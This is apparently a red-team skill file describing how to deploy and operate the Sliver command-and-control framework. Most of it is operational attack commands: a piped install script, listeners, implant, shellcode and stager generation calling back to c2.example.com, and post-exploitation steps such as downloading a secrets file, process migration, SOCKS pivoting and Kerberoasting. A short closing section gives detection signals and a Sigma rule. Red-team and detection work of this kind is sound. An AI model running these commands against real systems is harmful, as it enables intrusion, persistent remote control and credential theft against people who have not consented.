---
name: building-c2-with-sliver
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: building-c2-with-sliver
description: >-
  Deploy and operate Sliver C2 framework for red team engagements. Covers implant
  generation, listener configuration, mTLS/HTTP/DNS C2 channels, and pivoting.
domain: cybersecurity
subdomain: red-team
tags:
  - c2
  - sliver
  - implant
  - mtls
  - beacon
  - post-exploitation
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1071.001", "T1573.002", "T1105"]
  tools: ["sliver", "sliver-client", "armory"]
---

# Building C2 with Sliver

## Overview

Sliver is an open-source adversary emulation framework supporting mTLS, WireGuard,
HTTP(S), and DNS C2 channels with session (interactive) and beacon (async) modes.
Implants are unique per-generation with configurable obfuscation.

## Prerequisites

- Sliver server on team server
- Network egress from target to C2 infrastructure
- TLS certificates for HTTPS C2
- DNS domain for DNS C2

```bash
curl https://sliver.sh/install | sudo bash
sliver-server
```

## Key Concepts

### Session vs Beacon

| Mode | Behavior | Use Case |
|------|----------|---------|
| Session | Real-time interactive | Active exploitation |
| Beacon | Async check-in | Long-term persistence |

### C2 Channels

| Channel | Port | Stealth | Reliability |
|---------|------|---------|------------|
| mTLS | 8888 | Medium | High |
| HTTPS | 443 | High | High |
| DNS | 53 | Highest | Low bandwidth |
| WireGuard | 51820 | Medium | High |

## Workflow

### Step 1: Start Listeners

```
mtls --lhost 0.0.0.0 --lport 8888
https --domain c2.example.com --lport 443
dns --domains c2dns.example.com --lport 53
jobs
```

### Step 2: Generate Implants

```
generate --mtls c2.example.com:8888 --os windows --arch amd64 --save implant.exe
generate beacon --http https://c2.example.com --os linux --seconds 30 --jitter 50
generate --format shellcode --save payload.bin
generate stager --lhost c2.example.com --lport 8443 --protocol tcp
```

### Step 3: Post-Exploitation

```
sessions / beacons / use <SESSION_ID>
info / whoami / getuid / ps / netstat
download C:\Users\admin\secrets.txt
upload /tools/tool.exe C:\Temp\t.exe
migrate --pid 1234
pivots tcp --bind 0.0.0.0:9050
socks5 start
```

### Step 4: Armory Extensions

```
armory install rubeus
armory install seatbelt
rubeus kerberoast
seatbelt -- -group=all
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|------------|
| JA3/JA3S | Network | TLS fingerprint |
| DNS TXT volume | DNS logs | High volume to single domain |
| Named pipes | Sysmon 17/18 | Default pipe patterns |

```yaml
title: Sliver C2 DNS Beaconing
id: d9e5f3a7-2b4c-46d1-a8f3-5e7b1c9d4a6f
status: experimental
description: High-volume DNS TXT queries to single domain
logsource:
  category: dns_query
detection:
  selection:
    query_type: TXT
  timeframe: 5m
  condition: selection | count(query) by query_name > 50
falsepositives:
  - DKIM/SPF verification
level: medium
tags:
  - attack.command_and_control
  - attack.t1071.004
```

## Verification

- [ ] Listener started and accepting connections
- [ ] Implant generated for target OS
- [ ] Session/beacon established
- [ ] Post-exploitation commands successful

## References

- [Sliver C2](https://sliver.sh/docs)
- [Sliver GitHub](https://github.com/BishopFox/sliver)
- [MITRE T1071.001](https://attack.mitre.org/techniques/T1071/001/)
